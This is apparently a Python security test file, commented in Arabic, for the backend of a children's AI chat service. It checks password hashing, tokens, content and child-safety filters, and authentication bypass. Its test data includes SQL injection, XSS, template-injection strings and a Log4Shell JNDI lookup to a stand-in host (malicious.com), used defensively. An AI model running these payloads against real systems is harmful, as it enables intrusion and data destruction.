import sys
from pathlib import Path

# Add src to path
src_path = Path(__file__).parent
while src_path.name != "backend" and src_path.parent != src_path:
    src_path = src_path.parent
src_path = src_path / "src"

if str(src_path) not in sys.path:
    sys.path.insert(0, str(src_path))

"""
اختبارات الأمان الشاملة
"""

try:
    import pytest
except ImportError:
    try:
        from common.mock_pytest import pytest
    except ImportError:
        pass
    # Mock pytest when not available
    class MockPytest:
        def fixture(self, *args, **kwargs):
            def decorator(func):
                return func
            return decorator
        
        def mark(self):
            class MockMark:
                def parametrize(self, *args, **kwargs):
                    def decorator(func):
                        return func
                    return decorator
                
                def asyncio(self, func):
                    return func
                
                def slow(self, func):
                    return func
                
                def skip(self, reason=""):
                    def decorator(func):
                        return func
                    return decorator
            return MockMark()
        
        def raises(self, exception):
            class MockRaises:
                def __enter__(self):
                    return self
                def __exit__(self, *args):
                    return False
            return MockRaises()
        
        def skip(self, reason=""):
            def decorator(func):
                return func
            return decorator
    
    pytest = MockPytest()
from infrastructure.security.real_auth_service import AuthService
from infrastructure.ai.real_ai_service import AIService

class TestSecurity:
    """اختبارات الأمان"""
    
    def setup_method(self):
        """إعداد الاختبار"""
        self.auth_service = AuthService()
        self.ai_service = AIService()
    
    def test_password_strength(self):
        """اختبار قوة تشفير كلمة المرور"""
        passwords = ["weak", "StrongPassword123!", ""]
        
        for password in passwords:
            if password:  # تجنب كلمات المرور الفارغة
                hashed = self.auth_service.hash_password(password)
                
                # التأكد من أن التشفير مختلف عن كلمة المرور الأصلية
                assert hashed != password
                # التأكد من طول التشفير
                assert len(hashed) > 50
    
    def test_token_expiration_handling(self):
        """اختبار التعامل مع انتهاء صلاحية الرمز"""
        # هذا سيتطلب mock للوقت في تطبيق حقيقي
        user_data = {"sub": "user123", "email": "test@example.com"}
        token = self.auth_service.create_access_token(user_data)
        
        # التحقق من الرمز الصالح
        decoded = self.auth_service.verify_token(token)
        assert decoded is not None
    
    def test_injection_prevention(self):
        """اختبار منع حقن SQL"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "admin' OR '1'='1",
            "{{7*7}}",
            "${jndi:ldap://malicious.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            # اختبار أن النظام لا يتأثر بالمدخلات الضارة
            response = self.ai_service.generate_response(
                malicious_input,
                6,
                {"language": "en"}
            )
            
            # التأكد من أن الاستجابة آمنة
            assert response["safety_analysis"]["safe"] in [True, False]  # يجب أن يتم تحليلها
            # التأكد من عدم تنفيذ الكود الضار
            assert "DROP TABLE" not in response["response"]
            assert "<script>" not in response["response"]
    
    def test_child_safety_filters(self):
        """اختبار مرشحات أمان الأطفال"""
        unsafe_content = [
            "violence and weapons",
            "adult content",
            "scary nightmare",
            "alcohol and drugs"
        ]
        
        for content in unsafe_content:
            analysis = self.ai_service.analyze_safety(content)
            
            # يجب أن يتم اكتشاف المحتوى غير الآمن
            assert analysis["safe"] is False
            assert len(analysis["issues"]) > 0
    
    def test_data_sanitization(self):
        """اختبار تنظيف البيانات"""
        harmful_inputs = [
            "stupid kid",
            "I hate you",
            "shut up now"
        ]
        
        for harmful_input in harmful_inputs:
            filtered = self.ai_service.filter_content(harmful_input)
            
            # التأكد من إزالة المحتوى الضار
            assert "stupid" not in filtered
            assert "hate" not in filtered.lower()
            assert "shut up" not in filtered.lower()
    
    def test_age_verification(self):
        """اختبار التحقق من العمر"""
        ages = [3, 6, 9, 12]
        content = "Tell me about relationships"
        
        for age in ages:
            response = self.ai_service.generate_response(content, age, {})
            
            # التأكد من أن المحتوى مناسب للعمر
            if age < 8:
                # للأطفال الصغار، يجب تجنب المواضيع المعقدة
                assert "friend" in response["response"].lower() or "play" in response["response"].lower()
    
    @pytest.mark.security
    def test_authentication_bypass_attempts(self):
        """اختبار محاولات تجاوز المصادقة"""
        bypass_attempts = [
            ("", ""),
            ("admin", ""),
            ("", "password"),
            (None, None),
            ("admin' OR '1'='1' --", "password")
        ]
        
        for email, password in bypass_attempts:
            try:
                user = self.auth_service.authenticate_user(email, password)
                # جميع محاولات التجاوز يجب أن تفشل
                assert user is None
            except Exception:
                # إذا حدث خطأ، فهذا مقبول أيضاً
                pass
